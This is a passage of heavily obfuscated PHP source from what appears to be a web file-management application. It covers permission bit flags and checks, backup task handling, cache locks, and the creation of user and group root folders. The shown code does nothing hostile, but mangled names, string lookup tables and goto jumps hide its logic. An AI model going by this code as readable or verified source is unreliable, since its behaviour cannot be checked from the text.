(isset($ë§Áò¸Ô[$‚ùŞü˜Ñ[1951]])) { return Model($‚ùŞü˜Ñ[879])->groupFileTypeProfile($ë§Áò¸Ô[$‚ùŞü˜Ñ[1951]]); } $ÖŸ–—©· = $this->sourceSize(); $‚ñ–­îï = array($‚ùŞü˜Ñ[192] => 0, $‚ùŞü˜Ñ[190] => 1); $ÕŠÁõ ¥ = Model($‚ùŞü˜Ñ[879])->where($‚ñ–­îï)->sum($‚ùŞü˜Ñ[79]); $‚ñ–­îï[$‚ùŞü˜Ñ[190]] = 2; $«§ªá†Ê = Model($‚ùŞü˜Ñ[879])->where($‚ñ–­îï)->sum($‚ùŞü˜Ñ[79]); return array($‚ùŞü˜Ñ[818] => $ÖŸ–—©·[$‚ùŞü˜Ñ[79]], $‚ùŞü˜Ñ[1884] => $ÖŸ–—©·[$‚ùŞü˜Ñ[1884]], $‚ùŞü˜Ñ[1885] => (int) $ÕŠÁõ ¥, $‚ùŞü˜Ñ[1886] => (int) $«§ªá†Ê); } private function sourceSize() { $‚‹Ş­ëÄ =& $_SERVER[‹è™Ü¸Ñ]; $ç¯Á„šº = Model($‚‹Ş­ëÄ[879])->where(array($‚‹Ş­ëÄ[485] => 0))->sum($‚‹Ş­ëÄ[79]); $¬š«òŠ‚ = Model($‚‹Ş­ëÄ[544])->sum($‚‹Ş­ëÄ[79]); if ($¬š«òŠ‚ > $ç¯Á„šº) { $¬š«òŠ‚ = $ç¯Á„šº; } return array($‚‹Ş­ëÄ[79] => (int) $ç¯Á„šº, $‚‹Ş­ëÄ[1884] => (int) $¬š«òŠ‚); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $à÷»Å =& $_SERVER[‹è™Ü¸Ñ]; $Øù¹ß®ª = array(array($à÷»Å[494] => LNG($à÷»Å[1952]), $à÷»Å[1953] => $à÷»Å[1954], $à÷»Å[1955] => 1, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($à÷»Å[494] => LNG($à÷»Å[1958]), $à÷»Å[1953] => $à÷»Å[1959], $à÷»Å[1955] => 2, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($à÷»Å[494] => LNG($à÷»Å[1960]), $à÷»Å[1953] => $à÷»Å[1961], $à÷»Å[1955] => 3, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($à÷»Å[494] => LNG($à÷»Å[1962]), $à÷»Å[1953] => $à÷»Å[1963], $à÷»Å[1955] => 4, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_VIEW), array($à÷»Å[494] => LNG($à÷»Å[1964]), $à÷»Å[1953] => $à÷»Å[1965], $à÷»Å[1955] => 5, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($à÷»Å[494] => LNG($à÷»Å[1966]), $à÷»Å[1953] => $à÷»Å[1967], $à÷»Å[1955] => 6, $à÷»Å[1956] => 1, $à÷»Å[1957] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($à÷»Å[494] => LNG($à÷»Å[1968]), $à÷»Å[1953] => $à÷»Å[1969], $à÷»Å[1955] => 7, $à÷»Å[1956] => 1, $à÷»Å[1957] => 0)); return $Øù¹ß®ª; } public static function authCheck($ñ€ÌÕà, $é¹ø¢) { $¬áß†İî =& $_SERVER[‹è™Ü¸Ñ]; $ñ€ÌÕà = intval($ñ€ÌÕà); if (KodUser::isRoot() && $GLOBALS[$¬áß†İî[6]][$¬áß†İî[1970]]) { return !0; } if ($ñ€ÌÕà <= 0) { return !1; } if (($ñ€ÌÕà & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ñ€ÌÕà & $é¹ø¢); } public static function authCheckShow($çÌÁö¦—) { return self::authCheck($çÌÁö¦—, self::AUTH_SHOW); } public static function authCheckView($®Ëñ®¨¡) { return self::authCheck($®Ëñ®¨¡, self::AUTH_VIEW); } public static function authCheckDownload($ßÌ“—ì“) { return self::authCheck($ßÌ“—ì“, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¬«ş¥Ò) { return self::authCheck($¬«ş¥Ò, self::AUTH_UPLOAD); } public static function authCheckEdit($¡ñ¿îÀï) { return self::authCheck($¡ñ¿îÀï, self::AUTH_EDIT); } public static function authCheckRemove($«èßÕ˜Æ) { return self::authCheck($«èßÕ˜Æ, self::AUTH_REMOVE); } public static function authCheckShare($ïƒó”¨÷) { return self::authCheck($ïƒó”¨÷, self::AUTH_SHARE); } public static function authCheckComment($ƒœ‰°·›) { return self::authCheck($ƒœ‰°·›, self::AUTH_COMMENT); } public static function authCheckEvent($”‡è“®İ) { return self::authCheck($”‡è“®İ, self::AUTH_EVENT); } public static function authCheckRoot($ÉŠ†£Êß) { return self::authCheck($ÉŠ†£Êß, self::AUTH_ROOT); } public static function authCheckAction($âıî·ºÔ, $›’åÑåË) { $«Ï‚Ššâ =& $_SERVER[‹è™Ü¸Ñ]; $ºÁªÎÙ³ = array($«Ï‚Ššâ[1971] => self::AUTH_VIEW, $«Ï‚Ššâ[1259] => self::AUTH_DOWNLOAD, $«Ï‚Ššâ[110] => self::AUTH_UPLOAD, $«Ï‚Ššâ[1920] => self::AUTH_EDIT, $«Ï‚Ššâ[1919] => self::AUTH_REMOVE, $«Ï‚Ššâ[1930] => self::AUTH_SHARE, $«Ï‚Ššâ[430] => self::AUTH_COMMENT, $«Ï‚Ššâ[1740] => self::AUTH_EVENT, $«Ï‚Ššâ[1972] => self::AUTH_ROOT); if (!isset($ºÁªÎÙ³[$›’åÑåË])) { return; } $£©¹Ô¬Ş = $ºÁªÎÙ³[$›’åÑåË]; $âıî·ºÔ = intval($âıî·ºÔ); if ($âıî·ºÔ <= 0) { return !1; } if (($âıî·ºÔ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($âıî·ºÔ & $£©¹Ô¬Ş); } public static function authDisable($çµ“ö, $æÂïªÛ£) { if (intval($çµ“ö) <= 0) { return 0; } return intval($çµ“ö) & ~$æÂïªÛ£; } public $optionType = "\x53\171\163\164\145\x6d\x2e\163\x6f\x75\162\x63\145\x41\165\164\150\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\x61\165\x74\x68", "\x6c\141\x62\145\154", "\x64\151\163\160\154\x61\171", "\x73\171\163\164\x65\155", "\163\157\x72\x74"); public function initData() { $œŸ¼›ñı = $this->authDefault(); foreach ($œŸ¼›ñı as $¸áÑÙ) { $this->add($¸áÑÙ); } } public function findAuth($ØÃĞè§, $çøûã—Ø) { $úô¨£¶„ =& $_SERVER[‹è™Ü¸Ñ]; $ºğŞ’è = parent::listData(); foreach ($ºğŞ’è as $’Ï²ºé) { $©¿í‰ø = intval($’Ï²ºé[$úô¨£¶„[487]]); if ($©¿í‰ø <= 0 || $’Ï²ºé[$úô¨£¶„[1973]] == 0) { continue; } if (($©¿í‰ø & $ØÃĞè§) != $ØÃĞè§) { continue; } if (($©¿í‰ø & $çøûã—Ø) != 0) { continue; } return $’Ï²ºé[$úô¨£¶„[475]]; } return !1; } public function findAuthReadOnly() { $ö‹×“ƒƒ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ôõ¡©å = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ö‹×“ƒƒ, $ôõ¡©å); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ğ‚„¹éã =& $_SERVER[‹è™Ü¸Ñ]; $Â¨ø½Ë¥ = parent::listData(); $ü£¬û³ = !1; foreach ($Â¨ø½Ë¥ as $á¸—™ö«) { if ($á¸—™ö«[$ğ‚„¹éã[487]] <= 0 || $á¸—™ö«[$ğ‚„¹éã[1973]] == $ğ‚„¹éã[228]) { continue; } if (!$ü£¬û³) { $ü£¬û³ = $á¸—™ö«; continue; } if ($ü£¬û³[$ğ‚„¹éã[487]] > $á¸—™ö«[$ğ‚„¹éã[487]]) { $ü£¬û³ = $á¸—™ö«; } } return $ü£¬û³ ? $ü£¬û³[$ğ‚„¹éã[475]] : $ğ‚„¹éã[12]; } public function listData($˜ñ­©˜‘ = false, $Ù™Å¡êé = "\163\157\x72\x74", $ĞÂÅ…¿ = false) { return parent::listData($˜ñ­©˜‘, $Ù™Å¡êé, $ĞÂÅ…¿); } public function update($°ğÜ‘ÂÃ, $ğÙ®öİÀ) { $Û„Á¬îÒ =& $_SERVER[‹è™Ü¸Ñ]; $ÒÖ˜ï©ô = parent::listData($°ğÜ‘ÂÃ); $­Æş…Ô” = $this->findByName($ğÙ®öİÀ[$Û„Á¬îÒ[32]]); if (!$ÒÖ˜ï©ô || $­Æş…Ô” && $­Æş…Ô”[$Û„Á¬îÒ[475]] != $ÒÖ˜ï©ô[$Û„Á¬îÒ[475]]) { return !1; } $this->filterAuth($ğÙ®öİÀ[$Û„Á¬îÒ[487]]); return parent::update($°ğÜ‘ÂÃ, $ğÙ®öİÀ); } public function remove($´åšÆ·Ú) { $‰£”ãËŸ = parent::listData($´åšÆ·Ú); if (!$‰£”ãËŸ || $‰£”ãËŸ[$_SERVER[‹è™Ü¸Ñ][191]]) { return !1; } return parent::remove($´åšÆ·Ú); } public function add($¿ÀÑ¿˜ = array()) { $‹øì½²™ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->findByName($¿ÀÑ¿˜[$‹øì½²™[32]])) { return !1; } $…Ëú³®å = array($‹øì½²™[32] => $‹øì½²™[12], $‹øì½²™[487] => 1, $‹øì½²™[1974] => $‹øì½²™[1961], $‹øì½²™[1973] => 1, $‹øì½²™[191] => 0, $‹øì½²™[1975] => 0); $¿ÀÑ¿˜ = array_merge($…Ëú³®å, $¿ÀÑ¿˜); $¿ÀÑ¿˜[$‹øì½²™[1975]] = $this->getSort(); $this->filterAuth($¿ÀÑ¿˜[$‹øì½²™[487]]); return parent::insert($¿ÀÑ¿˜); } private function getSort() { $¾ä ª¬Ó =& $_SERVER[‹è™Ü¸Ñ]; $ä‰‹ì¯° = parent::listData(); $Å¾…â© = array_to_keyvalue($ä‰‹ì¯°, $¾ä ª¬Ó[12], $¾ä ª¬Ó[1975]); return empty($Å¾…â©) ? 0 : max($Å¾…â©) + 1; } private function filterAuth(&$ÁäªË¢¿) { if (!$ÁäªË¢¿) { return; } $·ÛóÖ¹² = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Â¤—·¸ = array(); foreach ($·ÛóÖ¹² as $¯ş´‰¿Ã) { if ($ÁäªË¢¿ & $¯ş´‰¿Ã) { $Â¤—·¸[] = $¯ş´‰¿Ã; } } if (in_array(self::AUTH_ROOT, $Â¤—·¸)) { $ÁäªË¢¿ = array_sum($·ÛóÖ¹²); return; } $¬áß„ø = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Â¤—·¸ as $¯ş´‰¿Ã) { if (isset($¬áß„ø[$¯ş´‰¿Ã])) { $Â¤—·¸ = array_merge($Â¤—·¸, $¬áß„ø[$¯ş´‰¿Ã]); } } $Â¤—·¸[] = self::AUTH_SHOW; $ÁäªË¢¿ = array_sum(array_unique($Â¤—·¸)); } public function sort($™ºĞÏ“¼, $Ô–š†€°) { return parent::update($™ºĞÏ“¼, $Ô–š†€°); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x62\x61\143\x6b\165\x70\114\151\x73\x74"; public $field = array("\151\x6f", "\x6e\141\x6d\145", "\163\x74\141\x74\x75\x73", "\143\157\156\x74\145\156\x74", "\x6d\141\x6e\165\141\154", "\162\145\x73\x75\x6c\x74", "\164\151\155\145\x46\162\x6f\155", "\x74\x69\155\x65\x54\x6f"); public function config() { $«â—¨½ı =& $_SERVER[‹è™Ü¸Ñ]; Action($«â—¨½ı[1976])->taskInit(); $ÉúÚË«˜ = Model($«â—¨½ı[825])->get($«â—¨½ı[838]); $ÉúÚË«˜ = json_decode($ÉúÚË«˜, !0); $ÉúÚË«˜ = is_array($ÉúÚË«˜) ? $ÉúÚË«˜ : array(); $this->parseContent($ÉúÚË«˜); unset($ÉúÚË«˜[$«â—¨½ı[1722]]); Model($«â—¨½ı[1721])->cacheClear(); $ı¢ªß†Ã = $«â—¨½ı[1977]; $Â§Ä‘¢» = Model($«â—¨½ı[1978])->findByKey($«â—¨½ı[1740], $ı¢ªß†Ã); if (!$Â§Ä‘¢») { $Â§Ä‘¢» = array(); } if (isset($Â§Ä‘¢»[$«â—¨½ı[206]])) { $Â§Ä‘¢»[$«â—¨½ı[206]] = json_decode($Â§Ä‘¢»[$«â—¨½ı[206]], !0); } if (isset($ÉúÚË«˜[$«â—¨½ı[206]])) { $Â§Ä‘¢»[$«â—¨½ı[206]][$«â—¨½ı[1725]] = $ÉúÚË«˜[$«â—¨½ı[206]]; unset($ÉúÚË«˜[$«â—¨½ı[206]]); } return array_merge($Â§Ä‘¢», $ÉúÚË«˜); } public function listData($¼üûÚå… = false, $ÈÌ¹™£‚ = "\x6d\x6f\x64\151\x66\x79\x54\x69\155\145", $¡Ã±´¡ = false) { $ÓÌÕûÍæ = parent::listData($¼üûÚå…, $ÈÌ¹™£‚, !0); if (!$ÓÌÕûÍæ) { return $ÓÌÕûÍæ; } if ($¼üûÚå…) { $ÓÌÕûÍæ = array($ÓÌÕûÍæ); } foreach ($ÓÌÕûÍæ as &$¤Üè”îĞ) { $this->parseContent($¤Üè”îĞ); } return $¼üûÚå… ? $ÓÌÕûÍæ[0] : $ÓÌÕûÍæ; } public function parseContent(&$¤˜¨ş) { $ Ò®—û… =& $_SERVER[‹è™Ü¸Ñ]; $€©—üÃÇ = _get($¤˜¨ş, $ Ò®—û…[171], $ Ò®—û…[91]); if (!in_array($€©—üÃÇ, array($ Ò®—û…[831], $ Ò®—û…[1191]))) { $¤˜¨ş[$ Ò®—û…[171]] = $€©—üÃÇ == $ Ò®—û…[91] ? $ Ò®—û…[1191] : $ Ò®—û…[831]; } } public function lastItem() { $àÑ‹ØÀÆ = $this->listData(); return !empty($àÑ‹ØÀÆ[0]) ? $àÑ‹ØÀÆ[0] : null; } public function kill($è‘¾Õ¬) { $È±ï™¹ø =& $_SERVER[‹è™Ü¸Ñ]; $õµ‘»ÍÄ = $this->listData($è‘¾Õ¬); if (!$õµ‘»ÍÄ || empty($õµ‘»ÍÄ[$È±ï™¹ø[32]])) { return !0; } Task::kill($È±ï™¹ø[837]); Task::kill($È±ï™¹ø[855]); Task::kill($È±ï™¹ø[864]); $¬”†‹¬ = $õµ‘»ÍÄ[$È±ï™¹ø[32]]; $öÎ†õ¶ = TEMP_FILES . $È±ï™¹ø[834] . $¬”†‹¬ . $È±ï™¹ø[8]; IO::remove($öÎ†õ¶, !1); return $this->remove($è‘¾Õ¬); } public function remove($àÒ³ñï) { $Áè«Ëš = $this->listData($àÒ³ñï); if (!$Áè«Ëš) { return !0; } return $this->backupRemove($Áè«Ëš); } private function backupRemove($‰ò®Óñ) { parent::remove($‰ò®Óñ[$_SERVER[‹è™Ü¸Ñ][475]]); $º¶ÍÜ“Š = $this->backupPath($‰ò®Óñ); IO::remove($º¶ÍÜ“Š, !1); return !0; } private function backupPath($½İıÊû) { $Ê© ¡Í =& $_SERVER[‹è™Ü¸Ñ]; $Ù¹çàõé = $½İıÊû[$Ê© ¡Í[32]]; $û­ÚüÉû = Model($Ê© ¡Í[825])->get($Ê© ¡Í[826]); $ÜÌØÃ = substr(md5($Ê© ¡Í[827] . $û­ÚüÉû . $Ù¹çàõé), 0, 8); return "\173\x69\x6f\72{$½İıÊû[$Ê© ¡Í[807]]}\x7d\57\144\141\x74\141\x62\141\x73\x65\57\x62\x61\x63\153\x75\160\x2f" . $Ù¹çàõé . $Ê© ¡Í[11] . $ÜÌØÃ; } public function start() { $óáÊª÷Ã =& $_SERVER[‹è™Ü¸Ñ]; if ($GLOBALS[$óáÊª÷Ã[6]][$óáÊª÷Ã[92]][$óáÊª÷Ã[1979]] != $óáÊª÷Ã[91]) { return !0; } $§Çí€é± = $this->config(); if (!$§Çí€é± || $§Çí€é±[$óáÊª÷Ã[1722]] != $óáÊª÷Ã[91]) { return !1; } if ($§Çí€é±[$óáÊª÷Ã[171]] == $óáÊª÷Ã[831]) { $ ¸ªù‘Æ = Model($óáÊª÷Ã[825])->get($óáÊª÷Ã[1304]); if ($ ¸ªù‘Æ == $óáÊª÷Ã[1305]) { $§Çí€é±[$óáÊª÷Ã[171]] = $óáÊª÷Ã[1191]; } } $¥É”Ö®Æ = $this->process(); foreach ($¥É”Ö®Æ as $©‰¦…¦”) { if ($©‰¦…¦”) { return Task::restart($©‰¦…¦”[$óáÊª÷Ã[475]]); } } $ˆ¨„—… = new Backup(); $®—Û°Ç = $ˆ¨„—…->db(); if ($®—Û°Ç) { $®—Û°Ç = $ˆ¨„—…->dbFile(); if ($®—Û°Ç && $§Çí€é±[$óáÊª÷Ã[171]] == $óáÊª÷Ã[831]) { $®—Û°Ç = $ˆ¨„—…->file(); } } Backup::set(array($óáÊª÷Ã[805] => 1, $óáÊª÷Ã[816] => time())); return !0; } public function process() { $ë¬î¸¢Ö =& $_SERVER[‹è™Ü¸Ñ]; $ß»šˆñ = array($ë¬î¸¢Ö[812] => Task::get($ë¬î¸¢Ö[837]), $ë¬î¸¢Ö[817] => Task::get($ë¬î¸¢Ö[855]), $ë¬î¸¢Ö[230] => Task::get($ë¬î¸¢Ö[864])); $×÷ÏÊÓŠ = !1; foreach ($ß»šˆñ as &$İ˜¢Îú‹) { if ($×÷ÏÊÓŠ) { $İ˜¢Îú‹ = !1; continue; } if ($İ˜¢Îú‹) { $¨ËÎ‚©® = intval(_get($İ˜¢Îú‹, $ë¬î¸¢Ö[1757], 0)); if (time() - $¨ËÎ‚©® > 7200) { Task::kill($İ˜¢Îú‹[$ë¬î¸¢Ö[475]]); $×÷ÏÊÓŠ = !0; $İ˜¢Îú‹ = !1; } } } return $ß»šˆñ; } public function restore() { $…ûó„Äá =& $_SERVER[‹è™Ü¸Ñ]; ActionCall($…ûó„Äá[1118], !0, 1); ActionCall($…ûó„Äá[1118], !0, 0); } } goto e›”ƒ¨—†; FÖôˆà§: class CacheLockRedis { public function lock($³ß–¸îß, $ùú‰Š‹ = 10) { $”ñ‘Ÿ = Cache::init(); $×©™Âä = microtime(!0) + $ùú‰Š‹; while (microtime(!0) < $×©™Âä) { $íƒ¼ˆß = $”ñ‘Ÿ->get($³ß–¸îß); if (!$íƒ¼ˆß) { $­¤Ô× = $”ñ‘Ÿ->setLock($³ß–¸îß, $×©™Âä, $ùú‰Š‹); if ($­¤Ô×) { return !0; } } else { if ($íƒ¼ˆß < microtime(!0)) { $”ñ‘Ÿ->set($³ß–¸îß, $×©™Âä, $ùú‰Š‹ * 2); if ($”ñ‘Ÿ->get($³ß–¸îß) === $íƒ¼ˆß) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÃÕÂşø˜) { return Cache::init()->get($ÃÕÂşø˜); } public function unlock($¨ë°åÒ¤) { return Cache::init()->remove($¨ë°åÒ¤); } } class CacheLockMemcached { public function lock($Âø•ÖØÖ, $Øä˜ğÅÎ = 0) { $››¬Ú€ï = Cache::init(); $¼øéÑâ = microtime(!0) + $Øä˜ğÅÎ; while (microtime(!0) < $¼øéÑâ) { $ÄäŠ†ú• = $››¬Ú€ï->get($Âø•ÖØÖ); if (!$ÄäŠ†ú• || $ÄäŠ†ú• < microtime(!0)) { $‚×“˜©± = $››¬Ú€ï->handle->add($Âø•ÖØÖ, $¼øéÑâ, $Øä˜ğÅÎ); if ($‚×“˜©±) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($õôÂ²¤) { return Cache::init()->get($õôÂ²¤); } public function unlock($µÍ·Æ–Õ) { return Cache::init()->remove($µÍ·Æ–Õ); } } class CacheLockDatabase { public function lock($ıáúŒàÜ, $Ù…îôæİ = 0) { $Û…ú¾å = Model($_SERVER[‹è™Ü¸Ñ][883]); $Øå—ŞğÕ = microtime(!0) + $Ù…îôæİ; while (microtime(!0) < $Øå—ŞğÕ) { $ÅİÑŠİé = $Û…ú¾å->get($ıáúŒàÜ); if (!$ÅİÑŠİé || $ÅİÑŠİé < microtime(!0)) { $”‹¢á¯Å = $Û…ú¾å->set($ıáúŒàÜ, $Øå—ŞğÕ); if ($”‹¢á¯Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Õ²ù´ÂÙ) { return Model($_SERVER[‹è™Ü¸Ñ][883])->get($Õ²ù´ÂÙ); } public function unlock($Ô¶÷Ä) { Model($_SERVER[‹è™Ü¸Ñ][883])->remove($Ô¶÷Ä); } } goto D ™ìŒÕ³Û; A’†…´ç˜: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ºıŞ‚Ù¯) { $àøÈ­…ı =& $_SERVER[‹è™Ü¸Ñ]; $Ÿñõı¦Š = Model($àøÈ­…ı[577])->where(array($àøÈ­…ı[1743] => $ºıŞ‚Ù¯))->find(); $ß…õ¦† = $this->_mkdirRoot(SourceModel::TYPE_USER, $ºıŞ‚Ù¯, $Ÿñõı¦Š[$àøÈ­…ı[32]]); $this->userDesktopAdd($ß…õ¦†); return $ß…õ¦†; } public function userDesktopAdd($ÂãœÛ’¶) { $ûëªÆ„Ì =& $_SERVER[‹è™Ü¸Ñ]; $Ëô»Éë¢ = LNG($ûëªÆ„Ì[2230]); $¥¾¹–¨ú = $this->mkdir($ÂãœÛ’¶, $Ëô»Éë¢); $this->metaSet($¥¾¹–¨ú, $ûëªÆ„Ì[2231], $ûëªÆ„Ì[91]); $this->metaSet($ÂãœÛ’¶, $ûëªÆ„Ì[2232], $¥¾¹–¨ú); } public function userPathSafeAdd($œªÖ­³²) { $‹€Ñ‡µ• =& $_SERVER[‹è™Ü¸Ñ]; $şÃ›Â©¦ = Model($‹€Ñ‡µ•[577])->getInfoFull($œªÖ­³²); if (!$şÃ›Â©¦) { return !1; } if (_get($şÃ›Â©¦, $‹€Ñ‡µ•[599])) { return $şÃ›Â©¦[$‹€Ñ‡µ•[539]][$‹€Ñ‡µ•[2233]]; } $Ø‹É§²Ö = $this->_mkdirRoot(SourceModel::TYPE_USER, $œªÖ­³², $‹€Ñ‡µ•[2234], $‹€Ñ‡µ•[506]); Model($‹€Ñ‡µ•[577])->metaSet($œªÖ­³², $‹€Ñ‡µ•[2233], $Ø‹É§²Ö); $this->metaSet($Ø‹É§²Ö, $‹€Ñ‡µ•[2235], $œªÖ­³²); return $Ø‹É§²Ö; } public function groupRootAdd($†¢ü˜Ô³) { $ÔÒÉıâ¦ =& $_SERVER[‹è™Ü¸Ñ]; $ÃÛô¬ª = Model($ÔÒÉıâ¦[585])->where(array($ÔÒÉıâ¦[2043] => $†¢ü˜Ô³))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $†¢ü˜Ô³, $ÃÛô¬ª[$ÔÒÉıâ¦[32]]); } public function systemRootPathAdd($ñÁ°ø×­) { if ($ñÁ°ø×­ != $_SERVER[‹è™Ü¸Ñ][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ñÁ°ø×­); } public function userRootRemove($øıïï¡ñ) { $Äüü™óò = $this->targetSourceRoot(SourceModel::TYPE_USER, $øıïï¡ñ, !0); foreach ($Äüü™óò as $’ÕÊêšÑ) { if (!$’ÕÊêšÑ) { continue; } $this->remove($’ÕÊêšÑ[$_SERVER[‹è™Ü¸Ñ][193]], !1); } } public function groupRootRemove($ÏÙã¦êô) { $¶Ø¼‘à¢ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÏÙã¦êô); if (!$¶Ø¼‘à¢) { return; } $this->remove($¶Ø¼‘à¢[$_SERVER[‹è™Ü¸Ñ][193]], !1); } private function _mkdirRoot($µ”ÍÈ‰È, $áæ÷ÇøÖ, $©­˜²›, $£Ü ÁØå = '') { $“•õã«û =& $_SERVER[‹è™Ü¸Ñ]; $Ì›–Ëƒš = defined($“•õã«û[2177]) ? USER_ID : 0; $–§×àÔÒ = array($“•õã«û[477] => 0, $“•õã«û[648] => $µ”ÍÈ‰È, $“•õã«û[649] => $áæ÷ÇøÖ, $“•õã«û[646] => 1, $“•õã«û[650] => $Ì›–Ëƒš, $“•õã«û[651] => $Ì›–Ëƒš, $“•õã«û[647] => $£Ü ÁØå, $“•õã«û[652] => $“•õã«û[594], $“•õã«û[504] => 0, $“•õã«û[617] => 0, $“•õã«û[542] => 0, $“•õã«û[653] => $“•õã«û[12]); if ($ªÀŠ•«› = $this->where($–§×àÔÒ)->find()) { return $ªÀŠ•«›[$“•õã«û[193]]; } $Éµâé = "\115\157\144\145\x6c\x53\157\165\162\x63\x65\56\x6d\153\144\x69\x72\122\157\157\164\56{$µ”ÍÈ‰È}\x2e{$áæ÷ÇøÖ}\x2e" . $©­˜²›; CacheLock::lock($Éµâé); $–§×àÔÒ[$“•õã«û[32]] = $©­˜²›; $Ä­²ô¸ = $this->add($–§×àÔÒ); $­â˜İÊ = array($“•õã«û[654] => short_id($Ä­²ô¸)); $this->where(array($“•õã«û[491] => $Ä­²ô¸))->save($­â˜İÊ); CacheLock::unlock($Éµâé); return $Ä­²ô¸; } private function targetSourceRoot($÷’ÌÍ¹©, $Œò®‹±•, $®ÂÌ´ı™ = false) { $–é–í¯„ =& $_SERVER[‹è™Ü¸Ñ]; $ÖÚ»°í = array($–é–í¯„[477] => 0, $–é–í¯„[648] => $÷’ÌÍ¹©, $–é–í¯„[649] => $Œò®‹±•); if ($®ÂÌ´ı™) { $£ÚêÔ¬à = $this->where($ÖÚ»°í)->select(); return $£ÚêÔ¬à ? $£ÚêÔ¬à : array(); } $êØÈ±ş» = $this->where($ÖÚ»°í)->find(); return $êØÈ±ş» ? $êØÈ±ş» : array(); } public function sourceRootGroup($¬«ÖïÑå) { $Šà„Æ…ß =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($¬«ÖïÑå)) { $¬«ÖïÑå = array($¬«ÖïÑå); } $™»®Ê¿• = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¬«ÖïÑå, $Šà„Æ…ß[220]); $«ÆíÜßµ = array($Šà„Æ…ß[445] => $™»®Ê¿•, $Šà„Æ…ß[442] => array($Šà„Æ…ß[813] => count($¬«ÖïÑå))); $this->_listDataApply($«ÆíÜßµ[$Šà„Æ…ß[445]]); $this->_listMake($«ÆíÜßµ); return array_to_keyvalue($«ÆíÜßµ[$Šà„Æ…ß[85]], $Šà„Æ…ß[569]); } public function mkfile($”» Äõñ, $äóÒÍ™, $Í§­ÎüÇ = '', $÷ôÙ³Ÿ = REPEAT_RENAME) { $Áà™ÁšÈ =& $_SERVER[‹è™Ü¸Ñ]; $•†ÃÕœõ = Model($Áà™ÁšÈ[674])->addFileByContent($Í§­ÎüÇ, $äóÒÍ™); return $this->_createFileCall($”» Äõñ, $äóÒÍ™, $•†ÃÕœõ, $÷ôÙ³Ÿ, $Áà™ÁšÈ[1408]); } public function addFile($¡ Öˆ“Ø, $ƒÁ–Ô Ë, $ôÄÇü, $ñùâŸš = false, $¤Õ‡¼À = REPEAT_RENAME) { $èğ—¨š¦ = Model($_SERVER[‹è™Ü¸Ñ][674])->addFile($ƒÁ–Ô Ë, $ôÄÇü, $ñùâŸš); return $this->_createFileCall($¡ Öˆ“Ø, $ôÄÇü, $èğ—¨š¦, $¤Õ‡¼À); } public function addFileByFileID($„áàñÊš, $¶ó´ ö¶, $ĞèÁÃ, $–éñ«¢× = REPEAT_RENAME) { $›ÛŞ“‰º =& $_SERVER[‹è™Ü¸Ñ]; $ş§¼ó¥Ÿ = Model($›ÛŞ“‰º[674])->find($¶ó´ ö¶); Model($›ÛŞ“‰º[674])->linkAdd($¶ó´ ö¶); return $this->_createFileCall($„áàñÊš, $ĞèÁÃ, $ş§¼ó¥Ÿ, $–éñ«¢×); } public function addFileByRemote($«İí¤¾è, $€‚ğÂæÔ, $¤á½ä×µ, $ÃÒ‘‹‹ = array(), $åçàø¤¼ = REPEAT_RENAME) { $î·´¾Œà = 